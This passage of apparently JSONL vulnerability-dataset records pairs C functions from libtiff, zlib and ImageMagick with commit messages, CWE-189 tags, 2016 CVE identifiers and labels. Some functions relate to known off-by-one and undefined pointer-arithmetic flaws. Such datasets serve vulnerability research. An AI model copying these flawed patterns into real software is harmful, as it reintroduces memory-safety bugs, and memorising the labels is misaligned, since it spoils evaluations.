\n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_YCBCR_TO_RGB){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"No support for YCbCr to RGB in tile for %s\", \n\t\t\t\tTIFFFileName(input));\n\t\t\t_TIFFfree(buffer);\n\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_LAB_SIGNED_TO_UNSIGNED){\n\t\t\tt2p->tiff_datasize=t2p_sample_lab_signed_to_unsigned(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\t}\n\n\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile) != 0){\n\t\tt2p_tile_collapse_left(\n\t\t\tbuffer, \n\t\t\tTIFFTileRowSize(input),\n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth,\n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t}\n\n\n\tt2p_disable(output);\n\tTIFFSetField(output, TIFFTAG_PHOTOMETRIC, t2p->tiff_photometric);\n\tTIFFSetField(output, TIFFTAG_BITSPERSAMPLE, t2p->tiff_bitspersample);\n\tTIFFSetField(output, TIFFTAG_SAMPLESPERPIXEL, t2p->tiff_samplesperpixel);\n\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile) == 0){\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGEWIDTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth);\n\t} else {\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGEWIDTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth);\n\t}\n\tif(t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile) == 0){\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGELENGTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_ROWSPERSTRIP, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t} else {\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGELENGTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength);\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_ROWSPERSTRIP, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength);\n\t}\n\tTIFFSetField(output, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);\n\tTIFFSetField(output, TIFFTAG_FILLORDER, FILLORDER_MSB2LSB);\n\n\tswitch(t2p->pdf_compression){\n\tcase T2P_COMPRESS_NONE:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_NONE);\n\t\tbreak;\n#ifdef CCITT_SUPPORT\n\tcase T2P_COMPRESS_G4:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_CCITTFAX4);\n\t\tbreak;\n#endif\n#ifdef JPEG_SUPPORT\n\tcase T2P_COMPRESS_JPEG:\n\t\tif (t2p->tiff_photometric==PHOTOMETRIC_YCBCR) {\n\t\t\tuint16 hor = 0, ver = 0;\n\t\t\tif (TIFFGetField(input, TIFFTAG_YCBCRSUBSAMPLING, &hor, &ver)!=0) {\n\t\t\t\tif (hor != 0 && ver != 0) {\n\t\t\t\t\tTIFFSetField(output, TIFFTAG_YCBCRSUBSAMPLING, hor, ver);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(TIFFGetField(input, TIFFTAG_REFERENCEBLACKWHITE, &xfloatp)!=0){\n\t\t\t\tTIFFSetField(output, TIFFTAG_REFERENCEBLACKWHITE, xfloatp);\n\t\t\t}\n\t\t}\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_JPEG);\n\t\tTIFFSetField(output, TIFFTAG_JPEGTABLESMODE, 0); /* JPEGTABLESMODE_NONE */\n\t\tif(t2p->pdf_colorspace & (T2P_CS_RGB | T2P_CS_LAB)){\n\t\t\tTIFFSetField(output, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_YCBCR);\n\t\t\tif(t2p->tiff_photometric != PHOTOMETRIC_YCBCR){\n\t\t\t\tTIFFSetField(output, TIFFTAG_JPEGCOLORMODE, JPEGCOLORMODE_RGB);\n\t\t\t} else {\n\t\t\t\tTIFFSetField(output, TIFFTAG_JPEGCOLORMODE, JPEGCOLORMODE_RAW);\n\t\t\t}\n\t\t}\n\t\tif(t2p->pdf_colorspace & T2P_CS_GRAY){\n\t\t\t(void)0;\n\t\t}\n\t\tif(t2p->pdf_colorspace & T2P_CS_CMYK){\n\t\t\t(void)0;\n\t\t}\n\t\tif(t2p->pdf_defaultcompressionquality != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_JPEGQUALITY, \n\t\t\t\tt2p->pdf_defaultcompressionquality);\n\t\t}\n\t\tbreak;\n#endif\n#ifdef ZIP_SUPPORT\n\tcase T2P_COMPRESS_ZIP:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_DEFLATE);\n\t\tif(t2p->pdf_defaultcompressionquality%100 != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_PREDICTOR, \n\t\t\t\tt2p->pdf_defaultcompressionquality % 100);\n\t\t}\n\t\tif(t2p->pdf_defaultcompressionquality/100 != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_ZIPQUALITY, \n\t\t\t\t(t2p->pdf_defaultcompressionquality / 100));\n\t\t}\n\t\tbreak;\n#endif\n\tdefault:\n\t\tbreak;\n\t}\n\n\tt2p_enable(output);\n\tt2p->outputwritten = 0;\n\tbufferoffset = TIFFWriteEncodedStrip(output, (tstrip_t) 0, buffer,\n\t\t\t\t\t     TIFFStripSize(output)); \n\tif (buffer != NULL) {\n\t\t_TIFFfree(buffer);\n\t\tbuffer = NULL;\n\t}\n\tif (bufferoffset == -1) {\n\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t  \"Error writing encoded tile to output PDF %s\", \n\t\t\t  TIFFFileName(output));\n\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\treturn(0);\n\t}\n\t\n\twritten = t2p->outputwritten;\n\t\n\treturn(written);\n}\n", "func_hash": 42551173115675013096612302724416268458, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-10094", "cve_desc": "Off-by-one error in the t2p_readwrite_pdf_image_tile function in tools/tiff2pdf.c in LibTIFF 4.0.7 allows remote attackers to have unspecified impact via a crafted image.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-10094"}
{"idx": 160572, "project": "zlib", "commit_id": "d1d577490c15a0c6862473d7576352a9f18ef811", "project_url": "https://github.com/madler/zlib", "commit_url": "https://github.com/madler/zlib/commit/d1d577490c15a0c6862473d7576352a9f18ef811", "commit_message": "Avoid pre-decrement of pointer in big-endian CRC calculation.\n\nThere was a small optimization for PowerPCs to pre-increment a\npointer when accessing a word, instead of post-incrementing. This\nrequired prefacing the loop with a decrement of the pointer,\npossibly pointing before the object passed. This is not compliant\nwith the C standard, for which decrementing a pointer before its\nallocated memory is undefined. When tested on a modern PowerPC\nwith a modern compiler, the optimization no longer has any effect.\nDue to all that, and per the recommendation of a security audit of\nthe zlib code by Trail of Bits and TrustInSoft, in support of the\nMozilla Foundation, this \"optimization\" was removed, in order to\navoid the possibility of undefined behavior.", "target": 0, "func": "local unsigned long crc32_big(crc, buf, len)\n    unsigned long crc;\n    const unsigned char FAR *buf;\n    unsigned len;\n{\n    register z_crc_t c;\n    register const z_crc_t FAR *buf4;\n\n    c = ZSWAP32((z_crc_t)crc);\n    c = ~c;\n    while (len && ((ptrdiff_t)buf & 3)) {\n        c = crc_table[4][(c >> 24) ^ *buf++] ^ (c << 8);\n        len--;\n     }\n \n     buf4 = (const z_crc_t FAR *)(const void FAR *)buf;\n     while (len >= 32) {\n         DOBIG32;\n         len -= 32;\n    }\n    while (len >= 4) {\n         DOBIG4;\n         len -= 4;\n     }\n     buf = (const unsigned char FAR *)buf4;\n \n     if (len) do {\n        c = crc_table[4][(c >> 24) ^ *buf++] ^ (c << 8);\n    } while (--len);\n    c = ~c;\n    return (unsigned long)(ZSWAP32(c));\n}\n", "func_hash": 256731203865202003796516786678894937159, "file_name": "crc32.c", "file_hash": 233003446608341810855222203282721093717, "cwe": ["CWE-189"], "cve": "CVE-2016-9843", "cve_desc": "The crc32_big function in crc32.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact via vectors involving big-endian CRC calculation.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9843"}
{"idx": 160573, "project": "zlib", "commit_id": "e54e1299404101a5a9d0cf5e45512b543967f958", "project_url": "https://github.com/madler/zlib", "commit_url": "https://github.com/madler/zlib/commit/e54e1299404101a5a9d0cf5e45512b543967f958", "commit_message": "Avoid shifts of negative values inflateMark().\n\nThe C standard says that bit shifts of negative integers is\nundefined.  This casts to unsigned values to assure a known\nresult.", "target": 0, "func": "long ZEXPORT inflateMark(strm)\nz_streamp strm;\n {\n     struct inflate_state FAR *state;\n \n    if (strm == Z_NULL || strm->state == Z_NULL)\n        return (long)(((unsigned long)0 - 1) << 16);\n     state = (struct inflate_state FAR *)strm->state;\n    return (long)(((unsigned long)((long)state->back)) << 16) +\n         (state->mode == COPY ? state->length :\n             (state->mode == MATCH ? state->was - state->length : 0));\n }\n", "func_hash": 277856133545947640882307196932147570148, "file_name": "inflate.c", "file_hash": 118291032335358851693705705041332712538, "cwe": ["CWE-189"], "cve": "CVE-2016-9842", "cve_desc": "The inflateMark function in inflate.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact via vectors involving left shifts of negative integers.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9842"}
{"idx": 160574, "project": "zlib", "commit_id": "9aaec95e82117c1cb0f9624264c3618fc380cecb", "project_url": "https://github.com/madler/zlib", "commit_url": "https://github.com/madler/zlib/commit/9aaec95e82117c1cb0f9624264c3618fc380cecb", "commit_message": "Use post-increment only in inffast.c.\n\nAn old inffast.c optimization turns out to not be optimal anymore\nwith modern compilers, and furthermore was not compliant with the\nC standard, for which decrementing a pointer before its allocated\nmemory is undefined. Per the recommendation of a security audit of\nthe zlib code by Trail of Bits and TrustInSoft, in support of the\nMozilla Foundation, this \"optimization\" was removed, in order to\navoid the possibility of undefined behavior.", "target": 0, "func": "void ZLIB_INTERNAL inflate_fast(strm, start)\nz_streamp strm;\nunsigned start;         /* inflate()'s starting value for strm->avail_out */\n{\n    struct inflate_state FAR *state;\n    z_const unsigned char FAR *in;      /* local strm->next_in */\n    z_const unsigned char FAR *last;    /* have enough input while in < last */\n    unsigned char FAR *out;     /* local strm->next_out */\n    unsigned char FAR *beg;     /* inflate()'s initial strm->next_out */\n    unsigned char FAR *end;     /* while out < end, enough space available */\n#ifdef INFLATE_STRICT\n    unsigned dmax;              /* maximum distance from zlib header */\n#endif\n    unsigned wsize;             /* window size or zero if not using window */\n    unsigned whave;             /* valid bytes in the window */\n    unsigned wnext;             /* window write index */\n    unsigned char FAR *window;  /* allocated sliding window, if wsize != 0 */\n    unsigned long hold;         /* local strm->hold */\n    unsigned bits;              /* local strm->bits */\n    code const FAR *lcode;      /* local strm->lencode */\n    code const FAR *dcode;      /* local strm->distcode */\n    unsigned lmask;             /* mask for first level of length codes */\n    unsigned dmask;             /* mask for first level of distance codes */\n    code here;                  /* retrieved table entry */\n    unsigned op;                /* code bits, operation, extra bits, or */\n                                /*  window position, window bytes to copy */\n    unsigned len;               /* match length, unused bytes */\n    unsigned dist;              /* match distance */\n    unsigned char FAR *from;    /* where to copy match from */\n \n     /* copy state to local variables */\n     state = (struct inflate_state FAR *)strm->state;\n    in = strm->next_in;\n     last = in + (strm->avail_in - 5);\n    out = strm->next_out;\n     beg = out - (start - strm->avail_out);\n     end = out + (strm->avail_out - 257);\n #ifdef INFLATE_STRICT\n    dmax = state->dmax;\n#endif\n    wsize = state->wsize;\n    whave = state->whave;\n    wnext = state->wnext;\n    window = state->window;\n    hold = state->hold;\n    bits = state->bits;\n    lcode = state->lencode;\n    dcode = state->distcode;\n    lmask = (1U << state->lenbits) - 1;\n    dmask = (1U << state->distbits) - 1;\n\n    /* decode literals and length/distances until end-of-block or not enough\n        input data or output space */\n     do {\n         if (bits < 15) {\n            hold += (unsigned long)(*in++) << bits;\n             bits += 8;\n            hold += (unsigned long)(*in++) << bits;\n             bits += 8;\n         }\n         here = lcode[hold & lmask];\n      dolen:\n        op = (unsigned)(here.bits);\n        hold >>= op;\n        bits -= op;\n        op = (unsigned)(here.op);\n        if (op == 0) {                          /* literal */\n             Tracevv((stderr, here.val >= 0x20 && here.val < 0x7f ?\n                     \"inflate:         literal '%c'\\n\" :\n                     \"inflate:         literal 0x%02x\\n\", here.val));\n            *out++ = (unsigned char)(here.val);\n         }\n         else if (op & 16) {                     /* length base */\n             len = (unsigned)(here.val);\n             op &= 15;                           /* number of extra bits */\n             if (op) {\n                 if (bits < op) {\n                    hold += (unsigned long)(*in++) << bits;\n                     bits += 8;\n                 }\n                 len += (unsigned)hold & ((1U << op) - 1);\n                hold >>= op;\n                bits -= op;\n             }\n             Tracevv((stderr, \"inflate:         length %u\\n\", len));\n             if (bits < 15) {\n                hold += (unsigned long)(*in++) << bits;\n                 bits += 8;\n                hold += (unsigned long)(*in++) << bits;\n                 bits += 8;\n             }\n             here = dcode[hold & dmask];\n          dodist:\n            op = (unsigned)(here.bits);\n            hold >>= op;\n            bits -= op;\n            op = (unsigned)(here.op);\n            if (op & 16) {                      /* distance base */\n                 dist = (unsigned)(here.val);\n                 op &= 15;                       /* number of extra bits */\n                 if (bits < op) {\n                    hold += (unsigned long)(*in++) << bits;\n                     bits += 8;\n                     if (bits < op) {\n                        hold += (unsigned long)(*in++) << bits;\n                         bits += 8;\n                     }\n                 }\n                dist += (unsigned)hold & ((1U << op) - 1);\n#ifdef INFLATE_STRICT\n                if (dist > dmax) {\n                    strm->msg = (char *)\"invalid distance too far back\";\n                    state->mode = BAD;\n                    break;\n                }\n#endif\n                hold >>= op;\n                bits -= op;\n                Tracevv((stderr, \"inflate:         distance %u\\n\", dist));\n                op = (unsigned)(out - beg);     /* max distance in output */\n                if (dist > op) {                /* see if copy from window */\n                    op = dist - op;             /* distance back in window */\n                    if (op > whave) {\n                        if (state->sane) {\n                            strm->msg =\n                                (char *)\"invalid distance too far back\";\n                            state->mode = BAD;\n                            break;\n                        }\n #ifdef INFLATE_ALLOW_INVALID_DISTANCE_TOOFAR_ARRR\n                         if (len <= op - whave) {\n                             do {\n                                *out++ = 0;\n                             } while (--len);\n                             continue;\n                         }\n                         len -= op - whave;\n                         do {\n                            *out++ = 0;\n                         } while (--op > whave);\n                         if (op == 0) {\n                             from = out - dist;\n                             do {\n                                *out++ = *from++;\n                             } while (--len);\n                             continue;\n                         }\n #endif\n                     }\n                    from = window;\n                     if (wnext == 0) {           /* very common case */\n                         from += wsize - op;\n                         if (op < len) {         /* some from window */\n                             len -= op;\n                             do {\n                                *out++ = *from++;\n                             } while (--op);\n                             from = out - dist;  /* rest from output */\n                         }\n                    }\n                    else if (wnext < op) {      /* wrap around window */\n                        from += wsize + wnext - op;\n                        op -= wnext;\n                         if (op < len) {         /* some from end of window */\n                             len -= op;\n                             do {\n                                *out++ = *from++;\n                             } while (--op);\n                            from = window;\n                             if (wnext < len) {  /* some from start of window */\n                                 op = wnext;\n                                 len -= op;\n                                 do {\n                                    *out++ = *from++;\n                                 } while (--op);\n                                 from = out - dist;      /* rest from output */\n                             }\n                        }\n                    }\n                    else {                      /* contiguous in window */\n                        from += wnext - op;\n                         if (op < len) {         /* some from window */\n                             len -= op;\n                             do {\n                                *out++ = *from++;\n                             } while (--op);\n                             from = out - dist;  /* rest from output */\n                         }\n                     }\n                     while (len > 2) {\n                        *out++ = *from++;\n                        *out++ = *from++;\n                        *out++ = *from++;\n                         len -= 3;\n                     }\n                     if (len) {\n                        *out++ = *from++;\n                         if (len > 1)\n                            *out++ = *from++;\n                     }\n                 }\n                 else {\n                     from = out - dist;          /* copy direct from output */\n                     do {                        /* minimum length is three */\n                        *out++ = *from++;\n                        *out++ = *from++;\n                        *out++ = *from++;\n                         len -= 3;\n                     } while (len > 2);\n                     if (len) {\n                        *out++ = *from++;\n                         if (len > 1)\n                            *out++ = *from++;\n                     }\n                 }\n             }\n            else if ((op & 64) == 0) {          /* 2nd level distance code */\n                here = dcode[here.val + (hold & ((1U << op) - 1))];\n                goto dodist;\n            }\n            else {\n                strm->msg = (char *)\"invalid distance code\";\n                state->mode = BAD;\n                break;\n            }\n        }\n        else if ((op & 64) == 0) {              /* 2nd level length code */\n            here = lcode[here.val + (hold & ((1U << op) - 1))];\n            goto dolen;\n        }\n        else if (op & 32) {                     /* end-of-block */\n            Tracevv((stderr, \"inflate:         end of block\\n\"));\n            state->mode = TYPE;\n            break;\n        }\n        else {\n            strm->msg = (char *)\"invalid literal/length code\";\n            state->mode = BAD;\n            break;\n        }\n    } while (in < last && out < end);\n\n    /* return unused bytes (on entry, bits < 8, so in won't go too far back) */\n    len = bits >> 3;\n    in -= len;\n    bits -= len << 3;\n     hold &= (1U << bits) - 1;\n \n     /* update state and return */\n    strm->next_in = in;\n    strm->next_out = out;\n     strm->avail_in = (unsigned)(in < last ? 5 + (last - in) : 5 - (in - last));\n     strm->avail_out = (unsigned)(out < end ?\n                                  257 + (end - out) : 257 - (out - end));\n    state->hold = hold;\n    state->bits = bits;\n    return;\n}\n", "func_hash": 21320107842417320922485817989394716906, "file_name": "inffast.c", "file_hash": 318535073282265170250653548326610267480, "cwe": ["CWE-189"], "cve": "CVE-2016-9841", "cve_desc": "inffast.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact by leveraging improper pointer arithmetic.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9841"}
{"idx": 160575, "project": "zlib", "commit_id": "6a043145ca6e9c55184013841a67b2fef87e44c0", "project_url": "https://github.com/madler/zlib", "commit_url": "https://github.com/madler/zlib/commit/6a043145ca6e9c55184013841a67b2fef87e44c0", "commit_message": "Remove offset pointer optimization in inftrees.c.\n\ninftrees.c was subtracting an offset from a pointer to an array,\nin order to provide a pointer that allowed indexing starting at\nthe offset. This is not compliant with the C standard, for which\nthe behavior of a pointer decremented before its allocated memory\nis undefined. Per the recommendation of a security audit of the\nzlib code by Trail of Bits and TrustInSoft, in support of the\nMozilla Foundation, this tiny optimization was removed, in order\nto avoid the possibility of undefined behavior.", "target": 0, "func": "int ZLIB_INTERNAL inflate_table(type, lens, codes, table, bits, work)\ncodetype type;\nunsigned short FAR *lens;\nunsigned codes;\ncode FAR * FAR *table;\nunsigned FAR *bits;\nunsigned short FAR *work;\n{\n    unsigned len;               /* a code's length in bits */\n    unsigned sym;               /* index of code symbols */\n    unsigned min, max;          /* minimum and maximum code lengths */\n    unsigned root;              /* number of index bits for root table */\n    unsigned curr;              /* number of index bits for current table */\n    unsigned drop;              /* code bits to drop for sub-table */\n    int left;                   /* number of prefix codes available */\n    unsigned used;              /* code entries in table used */\n    unsigned huff;              /* Huffman code */\n    unsigned incr;              /* for incrementing code, index */\n    unsigned fill;              /* index for replicating entries */\n    unsigned low;               /* low bits for current root entry */\n    unsigned mask;              /* mask for low root bits */\n    code here;                  /* table entry for duplication */\n     code FAR *next;             /* next available space in table */\n     const unsigned short FAR *base;     /* base value table to use */\n     const unsigned short FAR *extra;    /* extra bits table to use */\n    unsigned match;             /* use base and extra for symbol >= match */\n     unsigned short count[MAXBITS+1];    /* number of codes of each length */\n     unsigned short offs[MAXBITS+1];     /* offsets in table for each length */\n     static const unsigned short lbase[31] = { /* Length codes 257..285 base */\n        3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31,\n        35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0};\n    static const unsigned short lext[31] = { /* Length codes 257..285 extra */\n        16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18,\n        19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 203, 198};\n    static const unsigned short dbase[32] = { /* Distance codes 0..29 base */\n        1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193,\n        257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145,\n        8193, 12289, 16385, 24577, 0, 0};\n    static const unsigned short dext[32] = { /* Distance codes 0..29 extra */\n        16, 16, 16, 16, 17, 17, 18, 18, 19, 19, 20, 20, 21, 21, 22, 22,\n        23, 23, 24, 24, 25, 25, 26, 26, 27, 27,\n        28, 28, 29, 29, 64, 64};\n\n    /*\n       Process a set of code lengths to create a canonical Huffman code.  The\n       code lengths are lens[0..codes-1].  Each length corresponds to the\n       symbols 0..codes-1.  The Huffman code is generated by first sorting the\n       symbols by length from short to long, and retaining the symbol order\n       for codes with equal lengths.  Then the code starts with all zero bits\n       for the first code of the shortest length, and the codes are integer\n       increments for the same length, and zeros are appended as the length\n       increases.  For the deflate format, these bits are stored backwards\n       from their more natural integer increment ordering, and so when the\n       decoding tables are built in the large loop below, the integer codes\n       are incremented backwards.\n\n       This routine assumes, but does not check, that all of the entries in\n       lens[] are in the range 0..MAXBITS.  The caller must assure this.\n       1..MAXBITS is interpreted as that code length.  zero means that that\n       symbol does not occur in this code.\n\n       The codes are sorted by computing a count of codes for each length,\n       creating from that a table of starting indices for each length in the\n       sorted table, and then entering the symbols in order in the sorted\n       table.  The sorted table is work[], with that space being provided by\n       the caller.\n\n       The length counts are used for other purposes as well, i.e. finding\n       the minimum and maximum length codes, determining if there are any\n       codes at all, checking for a valid set of lengths, and looking ahead\n       at length counts to determine sub-table sizes when building the\n       decoding tables.\n     */\n\n    /* accumulate lengths for codes (assumes lens[] all in 0..MAXBITS) */\n    for (len = 0; len <= MAXBITS; len++)\n        count[len] = 0;\n    for (sym = 0; sym < codes; sym++)\n        count[lens[sym]]++;\n\n    /* bound code lengths, force root to be within code lengths */\n    root = *bits;\n    for (max = MAXBITS; max >= 1; max--)\n        if (count[max] != 0) break;\n    if (root > max) root = max;\n    if (max == 0) {                     /* no symbols to code at all */\n        here.op = (unsigned char)64;    /* invalid code marker */\n        here.bits = (unsigned char)1;\n        here.val = (unsigned short)0;\n        *(*table)++ = here;             /* make a table to force an error */\n        *(*table)++ = here;\n        *bits = 1;\n        return 0;     /* no symbols, but wait for decoding to report error */\n    }\n    for (min = 1; min < max; min++)\n        if (count[min] != 0) break;\n    if (root < min) root = min;\n\n    /* check for an over-subscribed or incomplete set of lengths */\n    left = 1;\n    for (len = 1; len <= MAXBITS; len++) {\n        left <<= 1;\n        left -= count[len];\n        if (left < 0) return -1;        /* over-subscribed */\n    }\n    if (left > 0 && (type == CODES || max != 1))\n        return -1;                      /* incomplete set */\n\n    /* generate offsets into symbol table for each length for sorting */\n    offs[1] = 0;\n    for (len = 1; len < MAXBITS; len++)\n        offs[len + 1] = offs[len] + count[len];\n\n    /* sort symbols by length, by symbol order within each length */\n    for (sym = 0; sym < codes; sym++)\n        if (lens[sym] != 0) work[offs[lens[sym]]++] = (unsigned short)sym;\n\n    /*\n       Create and fill in decoding tables.  In this loop, the table being\n       filled is at next and has curr index bits.  The code being used is huff\n       with length len.  That code is converted to an index by dropping drop\n       bits off of the bottom.  For codes where len is less than drop + curr,\n       those top drop + curr - len bits are incremented through all values to\n       fill the table with replicated entries.\n\n       root is the number of index bits for the root table.  When len exceeds\n       root, sub-tables are created pointed to by the root entry with an index\n       of the low root bits of huff.  This is saved in low to check for when a\n       new sub-table should be started.  drop is zero when the root table is\n       being filled, and drop is root when sub-tables are being filled.\n\n       When a new sub-table is needed, it is necessary to look ahead in the\n       code lengths to determine what size sub-table is needed.  The length\n       counts are used for this, and so count[] is decremented as codes are\n       entered in the tables.\n\n       used keeps track of how many table entries have been allocated from the\n       provided *table space.  It is checked for LENS and DIST tables against\n       the constants ENOUGH_LENS and ENOUGH_DISTS to guard against changes in\n       the initial root table size constants.  See the comments in inftrees.h\n       for more information.\n\n       sym increments through all symbols, and the loop terminates when\n       all codes of length max, i.e. all codes, have been processed.  This\n       routine permits incomplete codes, so another loop after this one fills\n       in the rest of the decoding tables with invalid code markers.\n     */\n\n    /* set up for code type */\n     switch (type) {\n     case CODES:\n         base = extra = work;    /* dummy value--not used */\n        match = 20;\n         break;\n     case LENS:\n         base = lbase;\n         extra = lext;\n        match = 257;\n         break;\n     default:            /* DISTS */\n         base = dbase;\n         extra = dext;\n        match = 0;\n     }\n \n     /* initialize state for loop */\n    huff = 0;                   /* starting code */\n    sym = 0;                    /* starting code symbol */\n    len = min;                  /* starting code length */\n    next = *table;              /* current table to fill in */\n    curr = root;                /* current table index bits */\n    drop = 0;                   /* current bits to drop from code for index */\n    low = (unsigned)(-1);       /* trigger new sub-table when len > root */\n    used = 1U << root;          /* use root table entries */\n    mask = used - 1;            /* mask for comparing low */\n\n    /* check available table space */\n    if ((type == LENS && used > ENOUGH_LENS) ||\n        (type == DISTS && used > ENOUGH_DISTS))\n        return 1;\n\n    /* process all codes and make table entries */\n     for (;;) {\n         /* create table entry */\n         here.bits = (unsigned char)(len - drop);\n        if (work[sym] + 1 < match) {\n             here.op = (unsigned char)0;\n             here.val = work[sym];\n         }\n        else if (work[sym] >= match) {\n            here.op = (unsigned char)(extra[work[sym] - match]);\n            here.val = base[work[sym] - match];\n         }\n         else {\n             here.op = (unsigned char)(32 + 64);         /* end of block */\n            here.val = 0;\n        }\n\n        /* replicate for those indices with low len bits equal to huff */\n        incr = 1U << (len - drop);\n        fill = 1U << curr;\n        min = fill;                 /* save offset to next table */\n        do {\n            fill -= incr;\n            next[(huff >> drop) + fill] = here;\n        } while (fill != 0);\n\n        /* backwards increment the len-bit code huff */\n        incr = 1U << (len - 1);\n        while (huff & incr)\n            incr >>= 1;\n        if (incr != 0) {\n            huff &= incr - 1;\n            huff += incr;\n        }\n        else\n            huff = 0;\n\n        /* go to next symbol, update count, len */\n        sym++;\n        if (--(count[len]) == 0) {\n            if (len == max) break;\n            len = lens[work[sym]];\n        }\n\n        /* create new sub-table if needed */\n        if (len > root && (huff & mask) != low) {\n            /* if first time, transition to sub-tables */\n            if (drop == 0)\n                drop = root;\n\n            /* increment past last table */\n            next += min;            /* here min is 1 << curr */\n\n            /* determine length of next table */\n            curr = len - drop;\n            left = (int)(1 << curr);\n            while (curr + drop < max) {\n                left -= count[curr + drop];\n                if (left <= 0) break;\n                curr++;\n                left <<= 1;\n            }\n\n            /* check for enough space */\n            used += 1U << curr;\n            if ((type == LENS && used > ENOUGH_LENS) ||\n                (type == DISTS && used > ENOUGH_DISTS))\n                return 1;\n\n            /* point entry in root table to sub-table */\n            low = huff & mask;\n            (*table)[low].op = (unsigned char)curr;\n            (*table)[low].bits = (unsigned char)root;\n            (*table)[low].val = (unsigned short)(next - *table);\n        }\n    }\n\n    /* fill in remaining table entry if code is incomplete (guaranteed to have\n       at most one remaining entry, since if the code is incomplete, the\n       maximum code length that was allowed to get this far is one bit) */\n    if (huff != 0) {\n        here.op = (unsigned char)64;            /* invalid code marker */\n        here.bits = (unsigned char)(len - drop);\n        here.val = (unsigned short)0;\n        next[huff] = here;\n    }\n\n    /* set return parameters */\n    *table += used;\n    *bits = root;\n    return 0;\n}\n", "func_hash": 289193798494554865750270548373678193532, "file_name": "inftrees.c", "file_hash": 100230909780333245312657757251838817211, "cwe": ["CWE-189"], "cve": "CVE-2016-9840", "cve_desc": "inftrees.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact by leveraging improper pointer arithmetic.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9840"}
{"idx": 160706, "project": "ImageMagick", "commit_id": "0f6fc2d5bf8f500820c3dbcf0d23ee14f2d9f734", "project_url": "https://github.com/ImageMagick/ImageMagick", "commit_url": "https://github.com/ImageMagick/ImageMagick/commit/0f6fc2d5bf8f500820c3dbcf0d23ee14f2d9f734", "commit_message": "", "target": 0, "func": "static MagickBooleanType WritePICTImage(const ImageInfo *image_info,\n  Image *image,ExceptionInfo *exception)\n{\n#define MaxCount  128\n#define PictCropRegionOp  0x01\n#define PictEndOfPictureOp  0xff\n#define PictJPEGOp  0x8200\n#define PictInfoOp  0x0C00\n#define PictInfoSize  512\n#define PictPixmapOp  0x9A\n#define PictPICTOp  0x98\n#define PictVersion  0x11\n\n  const StringInfo\n    *profile;\n\n  double\n    x_resolution,\n    y_resolution;\n\n  MagickBooleanType\n    status;\n\n  MagickOffsetType\n    offset;\n\n  PICTPixmap\n    pixmap;\n\n  PICTRectangle\n    bounds,\n    crop_rectangle,\n    destination_rectangle,\n    frame_rectangle,\n    size_rectangle,\n    source_rectangle;\n\n  register const Quantum\n    *p;\n\n  register ssize_t\n    i,\n    x;\n\n   size_t\n     bytes_per_line,\n     count,\n    row_bytes,\n     storage_class;\n 